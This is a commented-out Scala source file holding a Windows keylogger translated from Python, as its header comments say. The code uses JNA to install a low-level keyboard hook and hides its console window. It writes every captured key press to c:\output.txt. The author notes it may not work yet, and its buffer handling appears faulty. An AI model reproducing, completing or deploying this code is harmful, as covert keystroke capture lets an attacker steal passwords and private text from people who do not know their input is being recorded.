////only for keylogging on windows machines
////dont know if this works yet, translated from python
//
////import com.sun.jna.platform.win32.WinDef._
//import com.sun.jna._
//import com.sun.jna.platform.win32.{WinUser, User32}
//import com.sun.jna.{Native, Pointer}
//
//object Keylogger {
//
//  def main(args: Array[String]): Unit = {
//    val hInstance = Native.getModuleHandle(null)
//    val callback = new LowLevelKeyboardProc {
//      def callback(nCode: Int, wParam: WPARAM, lParam: KBDLLHOOKSTRUCT): LRESULT = {
//        if (nCode >= 0 && wParam.intValue() == WinUser.WM_KEYDOWN) {
//          val vkCode = lParam.vkCode
//          if (vkCode == 5) {
//            sys.exit(1)
//          }
//          if (vkCode != 0 && vkCode != 8) {
//            val handle = User32.INSTANCE.GetConsoleWindow()
//            User32.INSTANCE.ShowWindow(handle, 0)
//
//            val outputFilePath = "c:\\output.txt"
//            val f = new java.io.RandomAccessFile(outputFilePath, "rw")
//            val buffer = new Array[Byte](1024)
//            val bytesRead = f.read(buffer)
//            val keylogs = vkCode.toChar.toString
//            if (vkCode == 13) {
//              buffer(bytesRead - 1) = '\n'.toByte
//            } else {
//              buffer(bytesRead) = keylogs.getBytes()(0)
//            }
//            f.seek(0)
//            f.write(buffer, 0, bytesRead + 1)
//            f.close()
//          }
//        }
//        User32.INSTANCE.CallNextHookEx(null, nCode, wParam, lParam.getPointer())
//      }
//    }
//
//    val hook = User32.INSTANCE.SetWindowsHookEx(
//      WinUser.WH_KEYBOARD_LL,
//      callback,
//      hInstance,
//      0
//    )
//
//    if (hook == null) {
//      System.err.println("Failed to install hook.")
//      sys.exit(1)
//    }
//
//    // This is important; if you don't call this, the JVM will
//    // exit immediately and the hook will be uninstalled
//    // prematurely
//    val message = new MSG()
//    while (User32.INSTANCE.GetMessage(message, null, 0, 0)) {
//      User32.INSTANCE.TranslateMessage(message)
//      User32.INSTANCE.DispatchMessage(message)
//    }
//    User32.INSTANCE.UnhookWindowsHookEx(hook)
//  }
//
//  trait LowLevelKeyboardProc extends HOOKPROC
//}
